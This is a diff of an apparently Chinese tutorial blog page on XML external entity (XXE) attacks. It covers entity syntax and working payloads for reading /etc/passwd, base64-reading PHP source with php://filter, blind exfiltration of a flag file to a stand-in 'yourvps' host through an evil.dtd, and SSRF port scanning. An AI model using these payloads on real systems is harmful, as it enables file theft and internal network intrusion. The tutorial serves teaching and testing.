@@ -98,7 +98,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/07/29/XXE/Picture8.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/29/XXE/Picture9.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/29/XXE/Picture10.png">
-<meta property="og:updated_time" content="2019-07-29T08:26:48.294Z">
+<meta property="og:updated_time" content="2019-07-29T08:34:34.452Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE原理及实现">
 <meta name="twitter:description" content="XXE原理及实现">
@@ -364,23 +364,23 @@
 <li><p>一般实体的声明：</p>
  <font color="#873650"><strong>\&lt;!ENTITY 实体名称 \”实体内容\”></strong></font>
 
-<p> 引用一般实体的方法:<font color="#873650"><strong>&amp;实体名称;</strong></font></p>
+<p> 引用一般实体的方法:  <font color="#873650"><strong>&amp;实体名称;</strong></font></p>
 <p> 普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
 </li>
 <li><p>参数实体的声明：</p>
- <font color="#873650"><strong>\&lt;!ENTITY % 实体名称 \”实体内容\”></strong></font>
+ <font color="#873650"><strong>&lt;!ENTITY % 实体名称 \实体内容”&gt;</strong></font>
 
-<p> 引用参数实体的方法: <font color="#873650"><strong>%实体名称;</strong></font></p>
+<p> 引用参数实体的方法:  <font color="#873650"><strong>%实体名称;</strong></font></p>
 <p> 参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</p>
 </li>
 </ol>
 <p><strong>基本格式：</strong></p>
-<font color="#873650"><strong>\&lt;!DOCTYPE 根元素名 [ 元素描述 ]></strong></font>
+<font color="#873650"><strong>&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt;</strong></font>
 
 <p>内部实体声明:</p>
-<p><font color="#873650"><strong>\&lt;!ENTITY 实体名称 \”实体的值\”></strong></font><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content "Hello world"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><font color="#873650"><strong>&lt;!ENTITY 实体名称 “实体的值”&gt;</strong></font><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content "Hello world"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>外部实体声明:</p>
-<p><font color="#873650"><strong>\&lt;!ENTITY 实体名称 SYSTEM \”URI/URL\”></strong></font><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://localhost:8888/untitled/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><font color="#873650"><strong>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;</strong></font><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://localhost:8888/untitled/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>evil.dtd<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>外部实体可支持http、file等协议。不同程序支持的协议不同，如下图</p>
 <p><img src="/2019/07/29/XXE/Picture1.png" alt></p>
@@ -391,45 +391,51 @@
 <p><a href="https://www.w3school.com.cn/php/php_ref_libxml.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/php_ref_libxml.asp</a></p>
 <p>一般xxe利用分为两大场景：有回显和无回显</p>
 <ol>
-<li>有回显</li>
-</ol>
-<p>内部实体:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>外部实体:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://yourvps/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>evil.dtd<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/07/29/XXE/Picture3.png" alt></p>
-<p>如果要读取php文件，因为php、html等文件中有各种括号\&lt;，>，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "php://filte/read=convert.base64-encode/resource=xxe.php"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/07/29/XXE/Picture4.png" alt></p>
-<ol start="2">
-<li>无回显</li>
-</ol>
+<li><p>有回显</p>
+<p> 内部实体:</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p> 外部实体:</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://yourvps/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p> evil.dtd</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/07/29/XXE/Picture3.png" alt></p>
+<p> 如果要读取php文件，因为php、html等文件中有各种括号\&lt;，>，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "php://filte/read=convert.base64-encode/resource=xxe.php"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/07/29/XXE/Picture4.png" alt></p>
+</li>
+<li><p>无回显</p>
 <ul>
 <li>payload1<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "flag.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://yourvps/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd; %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>flag.txt:<br>zww123</p>
-<p>evil.dtd<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p>
+<p>evil.dtd</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
 <p>yourvps:<br><strong>cat /var/log/httpd/access_log</strong></p>
 <p><img src="/2019/07/29/XXE/Picture5.png" alt></p>
 <ul>
 <li>payload2<br>当遇到文件内容中有特殊的字符不能被解析时（如下）</li>
 </ul>
 <p><img src="/2019/07/29/XXE/Picture11.png" alt></p>
-<p>当前的flag.txt文件内容为flag{this_is_flag}<br>则可以使用php伪协议进行读取<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://yourvps/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd; %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>当前的flag.txt文件内容为flag{this_is_flag}<br>则可以使用php伪协议进行读取</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://yourvps/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd; %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p><img src="/2019/07/29/XXE/Picture6.png" alt></p>
 <p><img src="/2019/07/29/XXE/Picture7.png" alt></p>
+</li>
+</ol>
 <ul>
-<li>调用过程</li>
+<li><p>调用过程</p>
+<p>  解析时%dtd引入xxe.xml，之后%all引入send的定义，最后引用了实体send，把%file文件内容通过一个http请求发了出去</p>
+</li>
 </ul>
-<p>解析时%dtd引入xxe.xml，之后%all引入send的定义，最后引用了实体send，把%file文件内容通过一个http请求发了出去</p>
 <ol start="3">
-<li>命令执行</li>
-</ol>
-<p>php环境下，xml命令执行要求php装有expect扩展。</p>
-<ol start="4">
-<li>端口检测</li>
-</ol>
-<p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "http://127.0.0.1:4301"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<li><p>命令执行</p>
+<p> php环境下，xml命令执行要求php装有expect扩展</p>
+</li>
+<li><p>端口检测</p>
+<p> 由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "http://127.0.0.1:4301"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p> 可以进行端口的扫描</p>
 <ul>
 <li><p>81端口未开放:<br><img src="/2019/07/29/XXE/Picture8.png" alt></p>
 </li>
@@ -438,7 +444,8 @@
 <li><p>4300端口开放:<br><img src="/2019/07/29/XXE/Picture10.png" alt></p>
 </li>
 </ul>
-<p>可以进行端口的扫描</p>
+</li>
+</ol>
 
       
     </div>
